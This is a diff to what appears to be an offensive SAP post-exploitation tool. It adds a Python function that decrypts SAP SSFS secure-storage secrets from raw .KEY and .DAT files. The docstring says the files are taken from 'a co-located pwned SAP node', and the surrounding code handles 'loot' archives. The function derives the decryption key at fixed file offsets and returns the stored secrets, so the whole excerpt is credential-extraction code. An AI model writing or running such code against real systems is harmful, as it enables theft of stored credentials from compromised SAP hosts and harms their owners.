@@ -308,6 +308,31 @@ def decrypt_ssfs_pure(loot_zip_path: str, *,
             "helper_jar": "(pure-python)", "sid": sid}
 
 
+def decrypt_ssfs_from_raw_bytes(key_bytes: bytes, dat_bytes: bytes) -> dict:
+    """Decrypt SSFS from raw KEY + DAT bytes read directly from disk.
+
+    Use this when the on-host files are available (e.g. via OS-exec on
+    a co-located pwned SAP node).  The backup-zip variant fails because
+    the backup process double-encrypts the SSFS blobs.
+
+    Returns the same shape as decrypt_ssfs_pure().
+    """
+    try:
+        from sap_rsec_cipher import rsec_decrypt_key
+    except Exception as e:
+        return {"ok": False, "error": f"sap_rsec_cipher not importable: {e}"}
+    if len(key_bytes) < 0xbb:
+        return {"ok": False, "error": f".KEY bytes too short ({len(key_bytes)}B)"}
+    try:
+        dek = rsec_decrypt_key(key_bytes[0x82:0xbb])
+    except Exception as e:
+        return {"ok": False, "error": f"DEK derivation failed: {e}"}
+    secrets = _parse_ssfs_records(dat_bytes, dek, keys_filter=None)
+    sid = _detect_ssfs_sid(dat_bytes) or _detect_ssfs_sid(key_bytes) or "SCC"
+    return {"ok": True, "secrets": secrets, "native_lib": "(pure-python)",
+            "helper_jar": "(pure-python)", "sid": sid}
+
+
 def decrypt_ssfs(loot_zip_path: str, *,
                  scc_native_lib: Optional[str] = None,
                  helper_jar: Optional[str] = None,
